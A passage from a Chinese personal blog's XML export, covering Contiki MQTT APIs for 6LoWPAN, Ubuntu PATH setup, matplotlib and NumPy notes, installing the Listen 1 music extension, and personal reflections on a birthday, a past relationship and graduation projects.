    <content type="text"><![CDATA[6LoWPAN无线传感网络中无线传感节点采用MQTT作为应用层协议是一种很好的选择，通过结合边界路由器、MQTT代理服务器和远程客户端可以实现无线传感网络的数据上传、管理以及远程控制等功能。本文通过Contiki操作系统中实现的MQTT协议来介绍6LoWPAN中MQTT客户端功能的实现。 MQTT简介 MQTT（Message Queuing Telemetry Transport，即消息队列遥测传输协议）是基于TCP/IP协议的基于发布订阅的消息传递协议。它被设计用于与需要“小代码占用”或网络带宽有限的远程位置的连接。 实现MQTT协议需要：客户端和服务器端。 MQTT协议中有三种身份：发布者（Publish）、代理（Broker）（服务器）、订阅者（Subscribe）。其中，消息的发布者和订阅者都是客户端，消息代理是服务器，消息发布者可以同时是订阅者。 MQTT传输的消息分为：主题（Topic）和负载（payload）两部分。 Topic，可以理解为消息的类型，订阅者订阅（Subscribe）后，就会收到该主题的消息内容（payload）payload，可以理解为消息的内容，是指订阅者具体要使用的内容。 MQTT API MQTT 的实现在Contiki的 apps/mqtt 目录下，它使用tcp-socket库，当前在Contiki中MQTT的实现只支持QoS 0和1。 MQTT注册注意：初始化MQTT引擎，必须在使用任何其他MQTT函数之前调用。 1234567891011121314/*** \brief 初始化MQTT引擎.* \param conn 指向MQTT连接的指针.* \param app_process 指向处理MQTT连接的应用程序进程的指针.* \param client_id 指向MQTT客户端ID的指针.* \param event_callback 回调函数负责处理来自MQTT引擎的回调.* \param max_segment_size MQTT/TCP连接的最大TCP分片大小.* \return MQTT_STATUS_OK or MQTT_STATUS_INVALID_ARGS_ERROR*/mqtt_status_t mqtt_register(struct mqtt_connection *conn, struct process *app_process, char *client_id, mqtt_event_callback_t event_callback, uint16_t max_segment_size); MQTT连接123456789101112/*** \brief 连接到一个MQTT代理.* \param conn 指向MQTT连接的指针.* \param host MQTT代理服务器的IP地址.* \param port MQTT代理的MQTT服务端口.* \param keep_alive 保持连接的心跳频率，服务器端从客户端接收消息的最大时间间隔.* \return MQTT_STATUS_OK or an error status*/mqtt_status_t mqtt_connect(struct mqtt_connection *conn, char *host, uint16_t port, uint16_t keep_alive); MQTT断开连接12345/*** \brief 与MQTT代理断开连接.* \param conn 指向MQTT连接的指针.*/void mqtt_disconnect(struct mqtt_connection *conn); MQTT订阅主题123456789101112/*** \brief 订阅一个MQTT主题.* \param conn 指向MQTT连接的指针.* \param mid 指向message ID的指针.* \param topic 指向要订阅的主题的指针.* \param qos_level 服务质量等级.* \return MQTT_STATUS_OK or some error status*/mqtt_status_t mqtt_subscribe(struct mqtt_connection *conn, uint16_t *mid, char *topic, mqtt_qos_level_t qos_level); MQTT取消订阅12345678910/*** \brief 取消订阅的主题.* \param conn 指向MQTT连接的指针.* \param mid 指向message ID的指针.* \param topic 指向要取消订阅的主题的指针.* \return MQTT_STATUS_OK or some error status*/mqtt_status_t mqtt_unsubscribe(struct mqtt_connection *conn, uint16_t *mid, char *topic); MQTT发布消息123456789101112131415161718/*** \brief 发布消息到一个MQTT主题.* \param conn 指向MQTT连接的指针.* \param mid 指向message ID的指针.* \param topic 指向要发布消息的主题的指针.* \param payload 指向主题有效载荷的指针.* \param payload_size 有效载荷大小.* \param qos_level 服务质量等级.* \param retain 保持标志，如果RETAIN标志设置为1，则表示服务器要保留这次推送的信息，如果有新的订阅者出现，就把这消息推送给它.* \return MQTT_STATUS_OK or some error status*/mqtt_status_t mqtt_publish(struct mqtt_connection *conn, uint16_t *mid, char *topic, uint8_t *payload, uint32_t payload_size, mqtt_qos_level_t qos_level, mqtt_retain_t retain); MQTT用户名密码123456789/*** \brief 设置MQTT客户端的用户名和密码.* \param conn 指向MQTT连接的指针.* \param username 指向用户名的指针.* \param password 指向密码的指针.*/void mqtt_set_username_password(struct mqtt_connection *conn, char *username, char *password); MQTT遗言 遗言就是一个由客户端预先定义好的主题和对应消息，附加在CONNECT的可变头部中，在客户端连接出现异常的情况下，由服务器主动发布此消息。 1234567891011/*** \brief 为MQTT客户端设置遗言主题和消息* \param conn 指向MQTT连接的指针.* \param topic 指向遗言主题的指针.* \param message 指向遗言消息的指针.* \param qos 服务质量等级.*/void mqtt_set_last_will(struct mqtt_connection *conn, char *topic, char *message, mqtt_qos_level_t qos); MQTT状态检测 可以使用以下帮助函数来声明MQTT连接状态，以检查节点是否连接到代理，如果连接已建立并且缓冲区中有空间可以发布，则使用mqtt_ready。 12345#define mqtt_connected(conn) \((conn)-&gt;state == MQTT_CONN_STATE_CONNECTED_TO_BROKER ? 1 : 0)#define mqtt_ready(conn) \(!(conn)-&gt;out_queue_full &amp;&amp; mqtt_connected((conn))) 参考文献：IPv6-WSN-book：https://github.com/marcozennaro/IPv6-WSN-book]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>6LoWPAN</tag>
        <tag>Contiki</tag>
        <tag>MQTT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[转]Ubuntu下修改环境变量的三种方法]]></title>
    <url>%2F2017%2F06%2F22%2F%E8%BD%AC-Ubuntu%E4%B8%8B%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Ubuntu下设置环境变量有三种方法，一种用于当前终端，一种用于当前用户，一种用于所有用户。 用于当前终端在当前终端中输入： 1export PATH=$PATH:&lt;你的要加入的路径&gt; 不过上面的方法只适用于当前终端，一旦当前终端关闭或在另一个终端中，则无效。 例如： 1export NDK_ROOT=/home/jiang/soft/Android-ndk-r8e 这样只能在当前终端使用。 用于当前用户在用户主目录下有一个 .bashrc 隐藏文件，可以在此文件中加入 PATH 的设置如下： 1$ vi ~/.bashrc 加入： 1export PATH=&lt;你的要加入的路径&gt;:$PATH 例如： 1export PATH=/home/jiang/soft/Android-ndk-r8e:$PATH 如果要加入多个路径，只要： 1export PATH=&lt;你要加入的路径1&gt;:&lt;你要加入的路径2&gt;: ...... :$PATH 当中每个路径要以冒号分隔。 这样每次登录都会生效 用于所有用户1sudo vi /etc/profile 加入： 1export PATH=&lt;你要加入的路径&gt;:$PATH 终端输入：echo $PATH 可以查看环境变量 注意，修改环境变量后，除了第一种方法立即生效外，第二第三种方法要立即生效，可以source ~/.bashrc或者注销再次登录后就可以了！]]></content>
      <categories>
        <category>转载</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python matplotlib学习笔记（一）]]></title>
    <url>%2F2017%2F06%2F18%2FPython-matplotlib%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Python数据分析与展示课程之Matplotlib绘图库学习。 简介 Matplotlib 是一个 Python 的 2D绘图库，它以各种硬拷贝格式和跨平台的交互式环境生成出版质量级别的图形。它能让使用者很轻松地将数据图形化，并且提供多样化的输出格式。 pyplot matplotlib.pyplot是绘制各类可视化图形的命令子库，它是是命令行式函数的集合，相当于快捷方式，每一个函数都对图像作了修改，比如创建图形，在图像上创建画图区域，在画图区域上画线，在线上标注等。 安装matplot之前先要安装Numpy，Numpy也是python的一个扩展包，提供基础的科学计算。 安装12python -m pip install -U pip setuptoolspython -m pip install matplotlib 测试 使用matplotlib绘制了x平方在区间[-6，6]的图像： 1234567891011#coding=utf-8import numpy as npimport matplotlib.pyplot as pltx = np.arange(-6,7,1)y = x**2plt.plot(x,y,&apos;b--&apos;)plt.show() plot函数函数定义 plt.plot(x, y, format_string, **kwargs) 参数说明： x ： X轴数据，列表或数组，可选 y ： Y轴数据，列表或数组 format_string ： 控制曲线的格式字符串，可选 **kwargs ：第二组或更多(x,y,format_string) plt.plot()只有一个输入列表或数组时，参数被当作Y轴，X轴以索引自动生成 plt.plot(x,y)当有两个以上参数时，按照X轴和Y轴顺序绘制数据点 注意：当绘制多条曲线时，各条曲线的x不能省略 format_string format_string：由颜色字符、风格字符和标记字符组成 颜色设置 plot 方法的关键字参数 color(或c) 用来设置线的颜色。 颜色字符 说明 颜色字符 说明 ‘b’ blue 蓝色 ‘y’ yellow 黄色 ‘g’ green 绿色 ‘k’ black 黑色 ‘r’ red 红色 ‘w’ white 白色 ‘c’ cyan 青绿色 ‘#rrggbb’ RGB颜色 ‘m’ magenta 洋红色 ‘0.8’ 灰度值 其中， RGB颜色字符串：(r, g, b) 或 (r, g, b, a)，其中 r g b a 取均为[0, 1]之间 灰度值字符串：[0, 1]之间的浮点数的字符串形式，表示灰度值。0表示黑色，1表示白色 样式设置 plot方法的关键字参数linestyle(或ls)用来设置线条的样式。 样式字符 说明 样式字符 说明 ‘-‘ 实线风格 ‘–’ 虚线风格 ‘-.’ 点划线风格 ‘:’ 虚线风格 ‘’ ‘ ‘ 无线条 标记设置 plot方法的关键字参数marker用来设置标记风格。 标记字符 说明 标记字符 说明 ‘.’ 点标记 ‘,’ 像素标记 ‘o’ 圆圈标记 ‘v’ 下三角标记 ‘^’ 上三角标记 ‘&lt;’ 左三角标记 ‘&gt;’ 右三角标记 ‘1’ 下花三角标记 ‘2’ 上花三角标记 ‘3’ 左花三角标记 ‘4’ 右花三角标记 ‘s’ 正方形标记 ‘p’ 五边形标记 ‘*’ 星标记 ‘h’ 六边形1标记 ‘H’ 六边形2标记 ‘+’ 十字标记 ‘x’ x标记 ‘D’ 菱形标记 ‘d’ 瘦菱形标记 ‘ ‘ 垂直线标记 ‘_’ _标记 markersize(ms)设置标记大小 markerfacecolor(mfc)设置标记颜色 markeredgecolor(mec)设置标记边缘的颜色 markeredgewidth(mew)设置标记边缘的宽度 更多属性设置请参考matplotlib的官方文档。 可以通过格式化参数指定线条的颜色和样式： 例如：’b–*’表示蓝色，虚线，用星号标记点 线条宽度 设置plot方法的关键字参数 linewidth(或lw) 可以改变线条的粗细，其值为浮点数。 线条标签 label : 给所绘制的曲线一个名字 label标签指定的名字在图示(legend)中显示，需在plt.show()之前调用plt.legend()。在字符串前后添加”$”符号，matplotlib会使用其内嵌的latex引擎绘制的数学公式。 图示默认绘制于图的右下角，legend方法可接受一个loc关键字参数来设定图例的位置，可取值为数字或字符串： 数字 字符串 说明 数字 字符串 说明 0 ‘best’ 默认 1 ‘upper right’ 右上角 2 ‘upper left’ 左上角 3 ‘lower left’ 左下角 4 ‘lower right’ 右下角 5 ‘right’ 右侧 6 ‘center left’ 左侧居中 7 ‘center right’ 右侧居中 8 ‘lower center’ 底部居中 9 ‘upper center’ 上方居中 10 ‘center’ 正中间 示例程序 123456789101112131415#coding=utf-8import numpy as npimport matplotlib.pyplot as pltx = np.arange(-6,7,1)y = x**1z = x**2plt.title(&apos;x and x square&apos;)plt.plot(x,y,&apos;b--&apos;,marker=&apos;+&apos;,label=&quot;$x^2$&quot;) #`b-`是`color=&quot;blue&quot;,linestyle=&quot;-&quot;`的简写形式plt.plot(x,z,color=&apos;r&apos;,linestyle=&apos;--&apos;,marker=&apos;*&apos;,label=&quot;$x^3$&quot;,linewidth=2)plt.legend(loc=1)plt.show() 绘图区域设置绘图区域的概念 在matplotlib中，整个图像为一个Figure对象。在Figure对象中可以包含一个，或者多个Axes对象。每个Axes对象都是一个拥有自己坐标系统的绘图区域。其逻辑关系如下： 一个Figure对应一张图片。Title为标题。Axis为坐标轴，Label为坐标轴标注。Tick为刻度线，Tick Label为刻度注释。 绘制子图plt.subplot(nrows, ncols, plot_number) 在全局绘图区域中创建一个分区体系，并定位到一个子绘图区域 参数说明： nrows ： 将整个绘图区域分成几行 ncols ： 将整个绘图区域分成几列 plot_number ： 当前绘制的区域编号 例如： plt.subplot(3,2,4)，也可省略逗号plt.subplot(324) 示例程序112345678910111213141516#coding=utf-8import numpy as npimport matplotlib.pyplot as pltx = np.arange(-6,7,1)y = x**1z = x**2plt.subplot(2,1,1)plt.plot(x,y)plt.subplot(212)plt.plot(x,z,&apos;r--&apos;)plt.show() 设置图表标题plt.title(‘标题字符串’)用于设置图表的标题。 设置坐标轴 轴区间设置 axis方法：axis([xmin,xmax,ymin,ymax]) 设置x轴的最大最小区间：xlim((xmin,xmax)) 设置y轴的最大最小区间：ylim((ymin,ymax)) 轴标签设置 plt.xlabel()方法用于设置x轴的轴标签 plt.ylabel()方法用于设置x轴的轴标签 设置网格线 plt.grid()函数可以提供是否显示网格的选项，在plot()之后加上grid(True)即可在坐标上显示网格。 保存图像 plt.savefig()将输出图形存储为文件，存储位置为当前python脚本所在目录，默认PNG格式，可以通过dpi修改输出质量。 示例程序21234567891011121314#coding=utf-8import numpy as npimport matplotlib.pyplot as pltx = np.arange(-6,7,1)y = xplt.axis([-6,6,-6,6]) plt.xlabel(&apos;x&apos;)plt.ylabel(&apos;y&apos;)plt.plot(x,y)plt.grid(True) #设置显示网格plt.savefig(&apos;example2&apos;, dpi=600)plt.show()]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Matplotlib</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Just Twenty Two]]></title>
    <url>%2F2017%2F06%2F17%2FJust-Twenty-Two%2F</url>
    <content type="text"><![CDATA[纪念22岁生日。（拖延症真是太可怕了，本来上个月应该完成的博客还是被我拖到了现在）。 5月20日，我的22岁生日，然而21日就是毕业设计答辩，答辩前一天生日确实有点尴尬，为了认真完成毕业答辩，于是把生日庆祝推迟了一天。不过，生日这天还是接到了很多祝福。 回忆起大学的四个生日，有和大家一起过的，也有默默度过的，或许我本来就是一个不太爱热闹的人，不希望太多人记得我的生日，不希望大家为我庆生，因为我真的是一个喜欢安静的人。另外，我对于有些事情是很懒的，从来不喜欢去记别人的生日，每次别人记得我的生日都会让我感到很惭愧。 不过，每次大家给我过生日我还是很感动很开心的，感谢为我庆生的老铁们。这次的生日，感谢一直记得我生日的家人，在群里给我发红包，祝我生日快乐，突然有点想回家了。 21日轻松完成答辩，准备晚上出去嗨一顿，3个室友加上领导和钟善良，虽然没有太多的人，但是吃了最好吃的蛋糕，唱了最满意的歌，吃了最喜欢的小龙虾，感觉真的很幸福了。谢谢室友的陪伴，谢谢领导和钟善良的蛋糕，答辩完，好多感触，谢谢你们陪我喝酒。 听到你们喊我部长我就很开心，更何况看到蛋糕上还是大写的Wuli 部长呢，哈哈哈哈哈。很多次说要戒酒，可是总忍不住要和大家一起喝。我就是这样一个人，有人陪我喝酒我就会很开心呀，因为我觉得很多人喝酒之后都会不一样，都会变得特别有意思。嗯，有你们陪我我就很开心了。可是，以后大概也真的很难再聚在一起喝酒了吧！ 以后，天南地北，我们过生日的时候也很难在一起聚了，只是，希望我们都能一直幸福下去，希望以后你们的朋友也像我一样爱你们（哈哈，找不到有钟傻傻的合照了，将就将就吧）。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[愿你以后的朋友像我一样爱你]]></title>
    <url>%2F2017%2F06%2F16%2F%E6%84%BF%E4%BD%A0%E4%BB%A5%E5%90%8E%E7%9A%84%E6%9C%8B%E5%8F%8B%E5%83%8F%E6%88%91%E4%B8%80%E6%A0%B7%E7%88%B1%E4%BD%A0%2F</url>
    <content type="text"><![CDATA[走过的路，见过的人；各有其因，各有其缘。 大学四年，临近毕业，好几次都有人问我，大学有什么遗憾吗？我都是很正经的回答了他们，因为，我真的没有认真思考过这个问题。 今天，无意间在手机的记事本中发现一个新浪博客的地址，点进去，原来是某位小姐姐的博客，还是当初我建议她写的。 翻了翻目录，发现一篇与我相关的，2016年2月的文章，很遗憾，现在才看到。 看完之后，有些感动，也突然觉得，大学四年还是有遗憾的。 当初，也是觉得感觉对了，所以想去试一试，但是，即使有过一段快乐的时光，也并未如愿。之后，也再没有找到过这样的感觉，不过，以后一定还是会有的。 或许这就是青春吧，至少，也曾追求过，不枉大学四年。 走过的路，见过的人；各有其因，各有其缘。 四年，也有人向我表白被我拒绝，或许，世界就是这样，我们都在做“贱人”，心里都装着一个自己喜欢的人，然后拒绝了喜欢你的人，或许也是缘分不够吧。 后来，很认真的思考过很多次，一直想要放弃却一直在挣扎，之后也有断断续续的联系，不过，后来慢慢被时间冲刷，也没有那么多深入的闲聊，慢慢地也就放弃了。如果不是这次看到这篇博客，或许也不曾想起这些事。 我的青春有你的脚印，只是我们未曾走远，说是缘分也好，说是遗憾也对，不管后来怎么样了，至少我们曾经一起开心过。嗯，就是这样的。 现在想想，其实，我们还是挺不合适的，只是聊得来。不过，还是谢谢你，我的小姐姐，谢谢曾经的陪伴，谢谢曾经的依赖，感谢曾经快乐的时光。愿你走向幸福的未来，愿你以后的朋友像我一样爱你。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搜歌，听歌，就用 Listen 1]]></title>
    <url>%2F2017%2F06%2F14%2F%E6%90%9C%E6%AD%8C%EF%BC%8C%E5%90%AC%E6%AD%8C%EF%BC%8C%E5%B0%B1%E7%94%A8-Listen-1%2F</url>
    <content type="text"><![CDATA[随着音乐的正版化，我们常常因为歌曲版权而不得不穿梭于各个音乐平台之间，比如我很喜欢网易云音乐，可是网易云音乐中林宥嘉的很多歌曲都无法收听，所以不得不到其他平台去找，总之，非常麻烦。现在，推荐给你的是一站式音乐搜索与播放工具Listen 1，搜歌，听歌，就用 Listen 1。 简介 Listen 1 是一个用Python语言开发的免费开源综合音乐搜索工具项目，它可以用来搜索并播放来自网易云音乐，虾米，QQ音乐三个主流音乐网站的歌曲以及收听精选音乐歌单，让你的曲库更加全面。目前，Listen 1已经提供Windows和Mac系统的桌面版以及Chrome和Firefox浏览器插件版本。 Listen 1提供“精选歌单”、“我的歌单”、“快速搜索”以及“关于”四个功能模块。 官方网站：http://githublisten1.coding.me/listen1/ Github仓库： https://github.com/listen1 桌面版安装 进入官网下载： 官方网站：http://githublisten1.coding.me/listen1/ 注意：如果使用浏览器下载较慢，请复制下载链接使用迅雷下载。 Google浏览器-Chrome安装推荐下载浏览器插件版本，安装方便快捷，使用也很简单。 下载项目的zip文件，在右上方有个 clone and Download，选择Download ZIP，然后 解压到本地。下载地址：http://githublisten1.coding.me/listen1/ 打开chrome浏览器，点击右上角的设置按钮下找到更多工具，打开扩展程序，然后勾选打开页面上方的开发者模式。 点击加载已解压的扩展程序，选中刚刚解压后的文件夹即可。 点击chorme右上角Listen 1的图标即可打开它。 Firefox浏览器打包安装 打包xpi文件（或在release页面下载已经打包好的xpi文件） 将根目录下manifest_firefox.json替换manifest.jsoncd listen1_chrome_extensionzip -r ../listen1.xpi *安装 打开Firefox，加载xpi文件，完成安装 使用体验 界面简洁，没有太多的花俏，功能没有专业的音乐播放器强大，但是基本功能都有，用户体验还不错。 搜索功能强大，搜歌、听歌方便快捷，但是目前还不支持歌曲下载。 不支持用户注册登录，重装插件或清除缓存数据会导致我的歌单数据丢失，但是它提供歌单备份功能，也支持歌单导入进行数据恢复。 最后，向Listen 1的作者致敬，感谢分享感谢开源，希望这个工具能够一直走下去。]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>软件</tag>
        <tag>工具</tag>
        <tag>Listen 1</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从毕业设计看如今的大学]]></title>
    <url>%2F2017%2F06%2F06%2F%E4%BB%8E%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1%E7%9C%8B%E5%A6%82%E4%BB%8A%E7%9A%84%E5%A4%A7%E5%AD%A6%2F</url>
    <content type="text"><![CDATA[博客已经一个月没有更新，这个月里，认真完成了自己的毕业设计，也帮助了其他几位同学完成毕业设计，这期间积累了很多值得用博客来记录的东西，不管是关于技术的还是关于生活的都让我觉得这个月过得很充实。 按照官方的说法：毕业设计是教学过程的最后阶段采用的一种总结性的实践教学环节。通过毕业设计，学生可以综合应用所学的各种理论知识和技能，进行全面、系统、严格的技术及基本能力的练习。 作为大学最后的考核，本来应该要求认真完成，可是，直到最后我才意识到这与我想象的毕业设计真的不一样。最近看到几篇微信推送，比如《本科生毕业设计那件小事》，这几篇微信推送想要表达的大都是学生对自己的毕业设计不负责，还得老师来催。 但是，就我自己的亲身经历，我感觉并不全是这样的。虽然，确实存在着老师比学生还着急的情况，但是，至少，在我们学校，大家都还是怕毕业设计不能过，然后都还是按照老师的要求在做。只是，不同的老师的要求不一样，不同的学生对于毕业设计的认真程度有差别，比如有的老师在外面开公司，一直是通过微信与学生进行联系，只是答辩的时候出现了一下，以至于对于学生毕业论文的要求没有明确，学生也觉得老师无所谓，所以也就没有重视起来。现在的学校了有一部分不作为的老师，他们总认为不是自己不想教学生，而是学生不行，或者学生态度差，可是，他们也不想想自己到底做了多少，是否真心实意想要教好学生，还是只是为了拿工资，然后外出去赚钱。每个老师都有来自家庭的压力，需要赚钱养家，这都是可以理解的，但是此外，你有没有认真的备课，认真地在带过学生，还是已经丢弃了自己作为老师的基本素质。 不过多的吐槽大环境了，毕竟我现在也改变不了什么，还是说说自己的毕业设计吧。自从去年获得推免资格，并确定好导师后就向导师表达了要过去做毕业设计的意愿，导师的意思也是希望我能够通过毕业设计对研究生期间的研究打下基础，所以很快就在导师的建议下确定了毕设的题目：基于6LoWPAN的智能家居系统的设计于是实现。 毕业设计和自己即将开始的研究生期间的研究方向有关，并且是在即将就读研究生的学校完成的，本科的指导老师和研究生的导师对我的毕业设计都给出了很多有意义的建议，并且在做毕设期间还得到了研究生师兄师姐以及博士师兄的支持和帮助。 毕业设计分为三步进行，前期主要进行资料查阅，方案对比与缺点，中期主要进行方案的实现与测试，后期则主要进行论文的撰写。由于之前只是对简单的51单片机有所学习，还没有进行过深入的学习，所以毕业设计对我来说也是充满了挑战。 几个月的毕业设计，自己觉得确实收获不少，临近答辩的那段时期，每天晚上都是凌晨1点睡，一步步完善自己的设计，修改论文。答辩前一天也是修改PPT到很晚，虽然到最后也还是有一些问题，但至少自己觉得没有辜负大学四年。不是说我每天都在做毕设就一定做得多好，只是我觉得我的态度比一些老师更端正。 而最让我感到绝望的是毕业设计答辩，老师对于你的设计并不懂，但是他们有没有耐心去听你的描述。答辩是要求做PPT的，但是基本上都不需要你讲毕业设计的背景以及所涉及的技术，而是直接演示效果，虽然，有一部分或许是由于自己描述得不是太让人感兴趣，但是老师们的态度实在让我失望，他们本来对我这个方向并不了解，对我使用的技术也并不清楚，但是却不愿意去听。几十个人的答辩，都要求一天之内搞完，有的甚至希望是半天就要搞完，你们的时间真的如此宝贵吗？我不知道这样的答辩意义何在。虽然也听说有极少数的班级答辩很严，这是我希望看到的，而且很多人答辩完之后还是很感谢这些要求严格的老师，但是其他基本上大部分其实都已经沦为一种形式，大家只不过都在配合演出罢了。 第一次体会到做科研的孤独，自己辛辛苦苦做出来，却得不到几个人的认可，关键是别人根本不愿意听。总听说，隔行如隔山，但是，现在即使没有隔行也感觉大家挺遥远的，这也让对于即将到来的研究生生活思考了很久，同一学科也有很多研究方向，今后该何去何从呢。 后来，毕设的成绩也让一些同学感到绝望，自己辛辛苦苦写代码写论文，却敌不过别人从网上找一个项目或者直接买一份得到的成绩高。不禁想问，我们的大学到底怎么了？记得北大钱理群教授说过的精致的利己主义者，这种不公平让投机者欢喜，却浇灭了那些踏踏实实做事的人的理想。 面对现实的种种，我对于如今国内一些大学的教育是失望的，因为到最后，教出来的竟然是只会弄虚作假的学生，可想而知他们今后走向社会，也难怪现在的人越来越现实了，或许我也是个理想主义者，只是，我也改变不了什么。 还好，来到新的学校，我的毕设得到的研究生期间导师的肯定，这份肯定对我来说是很重要的，这让我明白，我还可以继续为了理想而努力奋斗下去，期待三年之后不一样的自己。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Numpy学习笔记（二）]]></title>
    <url>%2F2017%2F04%2F28%2FPython-Numpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Python Numpy学习笔记第二篇。目前，正在学习北京理工大学嵩天老师在中国大学MOOC的课程：Python数据分析与展示。 ndarray数组的操作索引和切片索引：获取数组中特定位置元素的过程 切片：获取数组元素子集的过程 一维数组的索引和切片 123456789&gt;&gt;&gt; a = np.array([1, 2, 3, 4, 5, 6])&gt;&gt;&gt; a[2]3&gt;&gt;&gt; a[-2] # 从右开始5&gt;&gt;&gt; a[1:4] # 起始编号:终止编号(不含):步长array([2, 3, 4])&gt;&gt;&gt; a[0:6:2] # 指定步长为2array([1, 3, 5]) 多维数组的索引和切片 1234567891011&gt;&gt;&gt; a = np.array([[1, 2, 3],[4, 5, 6]])&gt;&gt;&gt; aarray([[1, 2, 3], [4, 5, 6]])&gt;&gt;&gt; a[1, 2]6&gt;&gt;&gt; a[-1,-2] # 从右开始5# 选取一个维度用:，不同维度用逗号分开&gt;&gt;&gt; a[:1, 1:] # 每个维度切片方法与一维数组相同array([[2, 3]]) 基本运算 一元函数 函数 说明 np.abs(x) np.fabs(x) 计算数组各元素的绝对值 np.sqrt(x) 计算数组各元素的平方根 np.square(x) 计算数组各元素的平方 np.log(x) np.log10(x) np.log2(x) 计算数组各元素的自然对数、10底对数和2底对数 np.ceil(x) np.floor(x) 计算数组各元素的ceiling值 或 floor值 12345678910111213141516171819&gt;&gt;&gt; a = np.array([-2, 4, 6])&gt;&gt;&gt; np.abs(a)array([2, 4, 6])&gt;&gt;&gt; aarray([-2, 4, 6])&gt;&gt;&gt; np.fabs(a)array([ 2., 4., 6.])&gt;&gt;&gt; b = np.square(a)&gt;&gt;&gt; barray([ 4, 16, 36])&gt;&gt;&gt; np.sqrt(b)array([ 2., 4., 6.])&gt;&gt;&gt; np.log2(b)array([ 2. , 4. , 5.169925])&gt;&gt;&gt; a = np.array([0.2, 1.5, 2.8])&gt;&gt;&gt; np.ceil(a)array([ 1., 2., 3.])&gt;&gt;&gt; np.floor(a)array([ 0., 1., 2.]) 函数 说明 np.rint(x) 计算数组各元素的四舍五入值 np.modf(x) 将数组各元素的小数和整数部分以两个独立数组形式返回 np.cos(x) np.cosh(x) 计算数组各元素的普通型和双曲型三角函数 np.sin(x) np.sinh(x) 计算数组各元素的普通型和双曲型三角函数 np.tan(x) np.tanh(x) 计算数组各元素的普通型和双曲型三角函数 np.exp(x) 计算数组各元素的指数值 np.sign(x) 计算数组各元素的符号值，1(+),0,‐1(‐) 二元函数 函数 说明 +, ‐, , /, * 两个数组各元素进行对应运算 np.maximum(x,y) np.fmax() 元素级的最大值/最小值计算 np.minimum(x,y) np.fmin() 元素级的最大值/最小值计算 np.mod(x,y) 元素级的模运算 np.copysign(x,y) 将数组y中各元素值的符号赋值给数组x对应元素 &gt;, &lt;, &gt;=, &lt;=, ==, != 算术比较，产生布尔型数组 1234567891011121314151617181920212223242526272829&gt;&gt;&gt; a = np.array([[1, 2, 3],[4, 5, 6]])&gt;&gt;&gt; b = np.array([[1, 2, 3],[4, 5, 6]])&gt;&gt;&gt; a + barray([[ 2, 4, 6], [ 8, 10, 12]])&gt;&gt;&gt; a - barray([[0, 0, 0], [0, 0, 0]])&gt;&gt;&gt; a * barray([[ 1, 4, 9], [16, 25, 36]])&gt;&gt;&gt; a / barray([[1, 1, 1], [1, 1, 1]])&gt;&gt;&gt; a**2array([[ 1, 4, 9], [16, 25, 36]])&gt;&gt;&gt; np.maximum(a, b)array([[1, 2, 3], [4, 5, 6]])&gt;&gt;&gt; np.fmax(a, b)array([[1, 2, 3], [4, 5, 6]])&gt;&gt;&gt; np.mod(a, b)array([[0, 0, 0], [0, 0, 0]])&gt;&gt;&gt; a &gt;= barray([[ True, True, True], [ True, True, True]], dtype=bool) ndarray数组的变换维度变换 方法 说明 .reshape(shape) 不改变数组元素，返回一个shape形状的数组，原数组不变 .resize(shape) 与.reshape()功能一致，但修改原数组 .swapaxes(ax1,ax2) 将数组n个维度中两个维度进行调换 .flatten() 对数组进行降维，返回折叠后的一维数组，原数组不变 1234567891011121314151617181920212223&gt;&gt;&gt; import numpy as np&gt;&gt;&gt; a = np.ones((2,6))&gt;&gt;&gt; aarray([[ 1., 1., 1., 1., 1., 1.], [ 1., 1., 1., 1., 1., 1.]])&gt;&gt;&gt; a.reshape((3,4))array([[ 1., 1., 1., 1.], [ 1., 1., 1., 1.], [ 1., 1., 1., 1.]])&gt;&gt;&gt; aarray([[ 1., 1., 1., 1., 1., 1.], [ 1., 1., 1., 1., 1., 1.]])&gt;&gt;&gt; a.resize((3,4))&gt;&gt;&gt; aarray([[ 1., 1., 1., 1.], [ 1., 1., 1., 1.], [ 1., 1., 1., 1.]])&gt;&gt;&gt; a.flatten()array([ 1., 1., 1., 1., 1., 1., 1., 1., 1., 1., 1., 1.])&gt;&gt;&gt; aarray([[ 1., 1., 1., 1.], [ 1., 1., 1., 1.], [ 1., 1., 1., 1.]]) 类型变换astype()方法一定会创建新的数组（原始数据的一个拷贝），即使两个类型一致。 12345678910&gt;&gt;&gt; a = np.ones((2,3), dtype=np.int32)&gt;&gt;&gt; aarray([[1, 1, 1], [1, 1, 1]])&gt;&gt;&gt; a.astype(np.float)array([[ 1., 1., 1.], [ 1., 1., 1.]])&gt;&gt;&gt; aarray([[1, 1, 1], [1, 1, 1]]) 转换成列表tolist()方式可以实现将ndarray数组转换成列表。 123456&gt;&gt;&gt; a = np.ones((2,3), dtype=np.int32)&gt;&gt;&gt; aarray([[1, 1, 1], [1, 1, 1]])&gt;&gt;&gt; a.tolist()[[1, 1, 1], [1, 1, 1]]]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
